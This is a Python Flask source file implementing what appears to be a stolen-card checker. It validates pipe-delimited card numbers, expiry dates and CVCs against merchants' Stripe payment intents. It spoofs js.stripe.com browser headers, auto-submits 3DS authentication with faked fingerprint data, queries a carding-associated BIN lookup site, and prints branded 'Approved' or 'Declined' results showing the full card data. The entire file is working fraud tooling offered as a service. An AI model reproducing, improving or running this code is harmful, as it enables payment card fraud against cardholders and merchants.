from flask import Flask, request, jsonify
import requests
import json
import time

app = Flask(__name__)

# Define URLs
PAYMENT_INTENT_URL = "https://api.stripe.com/v1/payment_intents"
THREEDS_AUTHENTICATE_URL = "https://api.stripe.com/v1/3ds2/authenticate"
BIN_LOOKUP_URL = "https://bins.antipublic.cc/bins/"

# Define common headers
COMMON_HEADERS = {
    'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML; like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    'Accept': "application/json",
    'Content-Type': "application/x-www-form-urlencoded",
    'origin': "https://js.stripe.com",
    'sec-fetch-site': "same-site",
    'sec-fetch-mode': "cors",
    'referer': "https://js.stripe.com/"
}

def confirm_payment_intent_with_payment_method(client_secret, card_details, public_key):
    card_info = card_details.split('|')
    card_number = card_info[0]
    exp_month = card_info[1]
    exp_year = card_info[2]
    cvc = card_info[3]

    url = f"{PAYMENT_INTENT_URL}/{client_secret.split('_secret_')[0]}/confirm"
    payload = (
        f"payment_method_data%5Btype%5D=card&payment_method_data%5Bcard%5D%5Bnumber%5D={card_number}&"
        f"payment_method_data%5Bcard%5D%5Bcvc%5D={cvc}&payment_method_data%5Bcard%5D%5Bexp_year%5D={exp_year}&"
        f"payment_method_data%5Bcard%5D%5Bexp_month%5D={exp_month}&payment_method_data%5Bbilling_details%5D%5Baddress%5D%5Bcountry%5D=IN&"
        f"key={public_key}&client_secret={client_secret}"
    )
    response = requests.post(url, data=payload, headers=COMMON_HEADERS)
    return response.json()

def authenticate_3ds(source, client_secret, public_key):
    payload = (
        f"source={source}&browser=%7B%22fingerprintAttempted%22%3Atrue%2C%22fingerprintData%22%3Anull%2C"
        f"%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Atrue%2C"
        f"%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A"
        f"%2224%22%2C%22browserScreenHeight%22%3A%22800%22%2C%22browserScreenWidth%22%3A%22360%22%2C%22browserTZ%22%3A"
        f"%22-330%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+%28Linux%3B+Android+10%3B+K%29+AppleWebKit%2F537.36+"
        f"%28KHTML%2C+like+Gecko%29+Chrome%2F124.0.0.0+Mobile+Safari%2F537.36%22%7D&one_click_authn_device_support%5Bhosted%5D"
        f"=false&one_click_authn_device_support%5Bsame_origin_frame%5D=false&one_click_authn_device_support%5Bspc_eligible%5D=false"
        f"&one_click_authn_device_support%5Bwebauthn_eligible%5D=false&one_click_authn_device_support%5Bpublickey_credentials_get_allowed%5D"
        f"=true&key={public_key}"
    )
    response = requests.post(THREEDS_AUTHENTICATE_URL, data=payload, headers=COMMON_HEADERS)
    return response.json()

def confirm_payment_intent_after_3ds(payment_intent_id, client_secret, public_key):
    url = f"{PAYMENT_INTENT_URL}/{payment_intent_id}"
    params = {
        'key': public_key,
        'client_secret': client_secret
    }
    response = requests.get(url, params=params, headers=COMMON_HEADERS)
    return response.json()

def get_bin_info(card_number):
    bin_number = card_number[:6]
    response = requests.get(f"{BIN_LOOKUP_URL}{bin_number}")
    return response.json()

def format_response(card_details, response, bin_info, time_taken, failed_3ds=False):
    card_info = card_details.split('|')
    card_number = card_info[0]
    exp_month = card_info[1]
    exp_year = card_info[2]
    cvc = card_info[3] if len(card_info) > 3 else 'N/A'

    status = response.get('status', '3DS')
    amount = response.get('amount', 'N/A')
    currency = response.get('currency', 'N/A')
    description = response.get('description', 'No Description')
    error_message = response.get('last_payment_error', {}).get('message', 'No Error Message')
    decline_code = response.get('last_payment_error', {}).get('decline_code', 'No Decline Code')
    three_ds_status = response.get('next_action', {}).get('use_stripe_sdk', {}).get('three_d_secure_2_source', 'N/A')

    info_message = (
        f"𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'N/A')} - {bin_info.get('type', 'N/A')} - {bin_info.get('level', 'N/A')}\n"
        f"𝐈𝐬𝐬𝐮𝐞𝐫: {bin_info.get('bank', 'N/A')}\n"
        f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info.get('country_name', 'N/A')} {bin_info.get('country_flag', '')}\n"
    )

    professional_signature = (
        "──────────────────────────────────\n"
        "🔒 Processed securely by:\n"
        "  𝗛𝗮𝗿𝘀𝗵, API Solutions \n"
        "──────────────────────────────────"
    )

    if status == 'succeeded':
        status_message = (
            f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n\n"
            f"𝗖𝗮𝗿𝗱: {card_number}|{exp_month}|{exp_year}|{cvc}\n"
            f"𝐒𝐭𝐚𝐭𝐮𝐬: {status}\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Payment successful.\n"
            f"Amount: {amount / 100:.2f} {currency}\n"
            f"Description: {description}\n"
            f"{info_message}"
            f"𝗧𝗶𝗺𝗲: {time_taken:.2f} seconds\n"
            f"{professional_signature}"
        )
    elif status == 'requires_action' and not failed_3ds:
        status_message = (
            f"𝐑𝐞𝐪𝐮𝐢𝐫𝐞𝐬 𝐀𝐜𝐭𝐢𝐨𝐧 ⚠️\n\n"
            f"𝗖𝗮𝗿𝗱: {card_number}|{exp_month}|{exp_year}|{cvc}\n"
            f"𝐒𝐭𝐚𝐭𝐮𝐬: {status}\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Payment requires additional action.\n"
            f"3DS Verification Status: {three_ds_status}\n"
            f"{info_message}"
            f"𝗧𝗶𝗺𝗲: {time_taken:.2f} seconds\n"
            f"{professional_signature}"
        )
    elif failed_3ds:
        status_message = (
            f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n\n"
            f"𝗖𝗮𝗿𝗱: {card_number}|{exp_month}|{exp_year}|{cvc}\n"
            f"𝐒𝐭𝐚𝐭𝐮𝐬: {status}\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: 3DS Verification Failed❌\n"
            f"{info_message}"
            f"𝗧𝗶𝗺𝗲: {time_taken:.2f} seconds\n"
            f"{professional_signature}"
        )
    else:
        status_message = (
            f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n\n"
            f"𝗖𝗮𝗿𝗱: {card_number}|{exp_month}|{exp_year}|{cvc}\n"
            f"𝐒𝐭𝐚𝐭𝐮𝐬: {status}\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {error_message}\n"
            f"Decline Code: {decline_code}\n"
            f"{info_message}"
            f"𝗧𝗶𝗺𝗲: {time_taken:.2f} seconds\n"
            f"{professional_signature}"
        )

    return status_message

@app.route('/inbuilt', methods=['GET'])
def inbuilt():
    try:
        start_time = time.time()

        public_key = request.args.get('pk')
        client_secret = request.args.get('cs')
        card_details = request.args.get('cc')

        bin_info = get_bin_info(card_details.split('|')[0])

        first_confirm_response = confirm_payment_intent_with_payment_method(client_secret, card_details, public_key)

        if first_confirm_response.get('status') == 'requires_action':
            three_ds_source = first_confirm_response['next_action']['use_stripe_sdk']['three_d_secure_2_source']
            auth_response = authenticate_3ds(three_ds_source, client_secret, public_key)
            
            if auth_response.get('state') == 'succeeded':
                final_response = confirm_payment_intent_after_3ds(first_confirm_response['id'], client_secret, public_key)
                result = format_response(card_details, final_response, bin_info, time.time() - start_time)
            else:
                result = format_response(card_details, auth_response, bin_info, time.time() - start_time, failed_3ds=True)
        else:
            result = format_response(card_details, first_confirm_response, bin_info, time.time() - start_time)

        return jsonify({"message": result})
    except Exception as e:
        return jsonify({'error': str(e)}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
  
